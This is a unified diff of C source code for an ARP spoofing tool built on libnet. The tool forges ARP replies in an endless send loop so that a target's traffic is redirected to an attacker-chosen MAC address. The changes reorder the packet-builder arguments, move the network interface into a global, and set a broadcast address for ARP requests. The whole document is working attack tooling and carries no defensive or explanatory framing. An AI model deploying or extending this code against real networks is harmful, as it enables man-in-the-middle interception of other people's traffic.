@@ -45,9 +45,9 @@ extern int errno;
 
 void usage(void);
 void log_error(int level, const char *fmt, ...);
-void build_packet(int op, u_int8_t* src_mac, u_int8_t* src_ip,
-    u_int8_t* dst_mac, u_int8_t* dst_ip);
-void start_spoof(int send_interval, const char* intf);
+void build_packet(int op, u_int8_t* src_ip, u_int8_t* src_mac,
+    u_int8_t* dst_ip, u_int8_t* dst_mac);
+void start_spoof(int send_interval);
 int arp_cache_lookup(in_addr_t ip, struct libnet_ether_addr *mac);
 int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac);
 int arp_force(in_addr_t dst);
@@ -72,13 +72,13 @@ char* redirect_ip_str  = NULL;         /* IP of MAC we want to redirect
                                           attacker's MAC is used */
 in_addr_t tgt_ip = 0, red_ip = 0, spf_ip = 0;
 struct libnet_ether_addr tgt_mac, red_mac;
+char* intf = NULL;                     /* interface */
 
 int main(int argc, char *argv[])
 {
   char err_buf[LIBNET_ERRBUF_SIZE];
   int opt = 0;
   int send_interval = 1000000;           /* send interval in usecond */
-  char* intf = NULL;                     /* interface */
 
   while ((opt = getopt_long(argc, argv, "i:n:t:r:hv", longopts, NULL)) != -1) {
     switch(opt) {
@@ -137,15 +137,15 @@ int main(int argc, char *argv[])
   spoof_ip_str = argv[optind];
   spf_ip = libnet_name2addr4(lnc, spoof_ip_str, LIBNET_RESOLVE);
 
-  build_packet(ARPOP_REPLY, (u_int8_t*)&red_mac, (u_int8_t*)&spf_ip,
-               (u_int8_t*)&tgt_mac, (u_int8_t*)&tgt_ip);
+  build_packet(ARPOP_REPLY, (u_int8_t*)&spf_ip, (u_int8_t*)&red_mac,
+               (u_int8_t*)&tgt_ip, (u_int8_t*)&tgt_mac);
 
-  start_spoof(send_interval, intf);
+  start_spoof(send_interval);
   return 0;
 }
 
-void build_packet(int op, u_int8_t* src_mac, u_int8_t* src_ip,
-    u_int8_t* dst_mac, u_int8_t* dst_ip) {
+void build_packet(int op, u_int8_t* src_ip, u_int8_t* src_mac,
+    u_int8_t* dst_ip, u_int8_t* dst_mac) {
 
   libnet_ptag_t p_tag;
 
@@ -166,7 +166,10 @@ void build_packet(int op, u_int8_t* src_mac, u_int8_t* src_ip,
   );
 
   if(-1 == p_tag)
-    log_error(LOG_FATAL, "can't build arp header\n");
+    log_error(LOG_FATAL | LOG_LIBNET, "can't build arp header\n");
+
+  if (op == ARPOP_REQUEST)
+    dst_mac = (u_int8_t*)"\xff\xff\xff\xff\xff\xff";
 
   p_tag = libnet_build_ethernet( /* create ethernet header */
       dst_mac,                   /* dest mac addr */
@@ -179,14 +182,14 @@ void build_packet(int op, u_int8_t* src_mac, u_int8_t* src_ip,
   );
 
   if(-1 == p_tag)
-    log_error(LOG_FATAL, "can't build ethernet header\n");
+    log_error(LOG_FATAL | LOG_LIBNET, "can't build ethernet header\n");
 }
 
-void start_spoof(int send_interval, const char* intf) {
+void start_spoof(int send_interval) {
   int size = 0;
   while (1) {
     if((size = libnet_write(lnc)) == -1) {
-      log_error(LOG_LIBNET, "can't send packet\n");
+      log_error(LOG_LIBNET | LOG_LIBNET, "can't send packet\n");
     }
     if (target_ip_str)
       printf("%s: %d bytes, target: %s: %s is at %s\n", intf, size, 
@@ -206,7 +209,7 @@ int arp_cache_lookup(in_addr_t ip, struct libnet_ether_addr *mac) {
   memset((char*)&ar, 0, sizeof(ar));
 
 #ifdef __linux__
-  strncpy(ar.arp_dev, "eth0", sizeof(ar.arp_dev));
+  strncpy(ar.arp_dev, intf, sizeof(ar.arp_dev));
 #endif
 
   sin = (struct sockaddr_in *)&ar.arp_pa;
@@ -241,10 +244,10 @@ int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac) {
     if (local_mac == NULL)
       log_error(LOG_FATAL | LOG_LIBNET,
                 "can't find MAC address for localhost\n");
-    build_packet(ARPOP_REQUEST, (u_int8_t*)local_mac, (u_int8_t*)&local_ip,
-                 (u_int8_t*)"\xff\xf\xff\xff\xff\xff", (u_int8_t*)&ip);
+    build_packet(ARPOP_REQUEST, (u_int8_t*)&local_ip, (u_int8_t*)local_mac,
+                 (u_int8_t*)&ip, (u_int8_t*)"\x00\x00\x00\x00\x00\x00");
     if(libnet_write(lnc) == -1) {
-      log_error(LOG_LIBNET, "can't send packet\n");
+      log_error(LOG_FATAL | LOG_LIBNET, "can't send packet\n");
     }
 #endif
     sleep(1);
@@ -260,7 +263,7 @@ int arp_force(in_addr_t dst)
   int i, fd;
 
   if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
-    return (0);
+    return 0;
 
   memset(&sin, 0, sizeof(sin));
   sin.sin_family = AF_INET;
